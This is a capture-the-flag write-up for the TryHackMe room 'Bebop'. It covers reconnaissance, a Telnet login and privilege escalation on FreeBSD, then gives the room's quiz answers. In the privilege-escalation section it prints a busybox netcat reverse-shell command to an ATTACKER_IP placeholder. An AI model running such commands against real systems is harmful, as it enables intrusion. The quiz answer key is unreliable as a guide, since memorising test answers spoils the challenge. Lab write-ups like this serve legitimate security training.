# Welcome everyone!

Today, we will explore “*Bebop*”, an easy-rated room on **TryHackMe**.

Without further ado, let’s get started!

![image](/THM/Bebop/Bebop_images/1.png)

(Note: the codename `pilot` has been given, we may need it for a later use) 

![image](/THM/Bebop/Bebop_images/2.png)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the system we’re targeting:

![image](/THM/Bebop/Bebop_images/3.png)

Two exposed services are running on the target:

- **SSH** (Port 22)
- **Telnet** (Port 23)

We can conclude from the nmap results that the operating system we’re targeting is **FreeBSD**.

## Initial Access

The room provides us with the codename `pilot`, which may be useful for authentication. Let's try using it as the Telnet username.

![image](/THM/Bebop/Bebop_images/4.png)

![image](/THM/Bebop/Bebop_images/5.png)

We successfully accessed the FreeBSD shell session. Listing the current directory allows us to retrieve the user flag:

![image](/THM/Bebop/Bebop_images/6.png)

## Privilege Escalation

We now need to find a way to escalate our current privileges in order to access the final flag located in the `/root` directory. One of the first things we want to check during the privilege escalation phase, is the sudo configuration concerning the current user. To see whether **pilot** can run any elevated command, we can run `sudo -l`:

![image](/THM/Bebop/Bebop_images/7.png)

It appears that the current user can execute the command of its choice through the `busybox` binary as `root` without providing a password.

This configuration is insecure, indeed, because this can be executed with **root privileges**, we could use the binary to spawn a privileged reverse shell. All we need is to set up a **Netcat listener** through `nc -lvnp PORT`. Afterwards, the following command can be executed to escalate our access to `root`:

`sudo busybox nc ATTACKER_IP NETCAT_PORT -e /bin/bash`

![image](/THM/Bebop/Bebop_images/8.png)

We successfully pivoted our initial access to **`root`**. The /root directory can now be accessed and the final flag can be fetched:

![image](/THM/Bebop/Bebop_images/9.png)

Challenge completed!

![image](/THM/Bebop/Bebop_images/10.png)




*Quizz answers*:

**What is the low privilleged user?**

→ Answer: **pilot**

**What binary was used to escalate privileges?**

→ Answer: **busybox**

**What service was used to gain an initial shell?**

→ Answer: **Telnet**

**Thank you for reading!**
